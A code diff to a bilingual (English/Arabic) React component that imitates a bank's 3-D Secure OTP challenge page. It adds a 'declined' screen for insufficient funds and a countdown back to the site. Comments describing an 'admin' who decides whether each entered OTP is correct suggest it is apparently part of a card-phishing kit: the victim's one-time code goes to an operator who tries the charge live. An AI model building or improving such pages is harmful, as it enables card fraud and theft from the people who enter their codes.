@@ -18,8 +18,12 @@ export type AcsOtpChallengeProps = {
   otpResendNotice?: boolean;
   resendCooldown?: number;
   resendLoading?: boolean;
-  /** checking = waiting for admin result (stay on Verify). completed = only then show redirect. */
-  externalState?: 'input' | 'checking' | 'failed' | 'idle' | 'completed';
+  /**
+   * checking = waiting for admin OTP result (stay on Verify).
+   * completed = correct OTP → short redirect then home.
+   * declined = correct OTP but card declined / insufficient funds → message on redirect page, auto home 10s.
+   */
+  externalState?: 'input' | 'checking' | 'failed' | 'idle' | 'completed' | 'declined';
   failReason?: string | null;
   onMethodNext?: () => void | Promise<void>;
   onSubmitOtp: (code: string) => void | Promise<void>;
@@ -71,13 +75,18 @@ export function AcsOtpChallenge({
     else if (onRetry) onRetry();
   };
 
-  // Stay on Verify while checking OTP — only redirect AFTER correct (completed)
-  const view: Phase =
+  // Stay on Verify while checking OTP — redirect only for completed or declined
+  const view: Phase | 'declined' =
     externalState === 'failed'
       ? 'failed'
-      : externalState === 'completed'
-        ? 'processing'
-        : phase;
+      : externalState === 'declined'
+        ? 'declined'
+        : externalState === 'completed'
+          ? 'processing'
+          : phase;
+
+  const isInsufficient =
+    /insufficient|balance|fund|credit|limit/i.test(String(failReason || ''));
 
   // Wrong OTP from admin/poll: stay on Verify and show error (never jump to redirect)
   useEffect(() => {
@@ -98,7 +107,7 @@ export function AcsOtpChallenge({
       setSubmitting(false);
       setPhase('processing');
     }
-    if (externalState === 'failed') {
+    if (externalState === 'declined' || externalState === 'failed') {
       setSubmitting(false);
     }
   }, [externalState]);
@@ -116,8 +125,11 @@ export function AcsOtpChallenge({
     return () => window.clearTimeout(t);
   }, [view]);
 
+  // Decline / insufficient OR redirect timeout → countdown then home
   useEffect(() => {
-    if (!redirectTimedOut || view !== 'processing') return;
+    const needsCountdown =
+      (view === 'processing' && redirectTimedOut) || view === 'declined';
+    if (!needsCountdown) return;
     setHomeCountdown(HOME_COUNTDOWN_SEC);
     const id = window.setInterval(() => {
       setHomeCountdown((c) => {
@@ -260,6 +272,37 @@ export function AcsOtpChallenge({
         </div>
       )}
 
+      {/* Correct OTP but card declined / insufficient credit — message on redirect page */}
+      {view === 'declined' && (
+        <div className="acs-screen">
+          <Header />
+          <h1 className="acs-h1">
+            {isAr ? 'تم رفض الدفع' : 'Payment declined'}
+          </h1>
+          <p className="acs-p">
+            {isInsufficient
+              ? isAr
+                ? 'الرصيد غير كافٍ أو تم رفض البطاقة. جرّب بطاقة أخرى أو تواصل مع البنك.'
+                : 'Insufficient credit or card declined. Please try another card or contact your bank.'
+              : isAr
+                ? 'تم رفض البطاقة من البنك. جرّب بطاقة أخرى أو تواصل مع البنك.'
+                : 'Your card was declined by the bank. Please try another card or contact your bank.'}
+          </p>
+          <p className="acs-p acs-countdown" aria-live="polite">
+            {isAr
+              ? `العودة للموقع خلال ${homeCountdown} ثانية...`
+              : `Returning to website in ${homeCountdown}s...`}
+          </p>
+          <button
+            type="button"
+            className="acs-btn acs-btn-primary"
+            onClick={() => goHomeRef.current?.()}
+          >
+            {isAr ? 'العودة للموقع' : 'Back to Website'}
+          </button>
+        </div>
+      )}
+
       {view === 'method' && (
         <div className="acs-screen">
           <Header />
@@ -323,7 +366,7 @@ export function AcsOtpChallenge({
             disabled={submitting || externalState === 'checking'}
             onClick={handleSubmit}
           >
-            {submitting || externalState === 'checking' ? 'Checking...' : 'Submit'}
+            {submitting || externalState === 'checking' ? '---' : 'Submit'}
           </button>
           <button
             type="button"
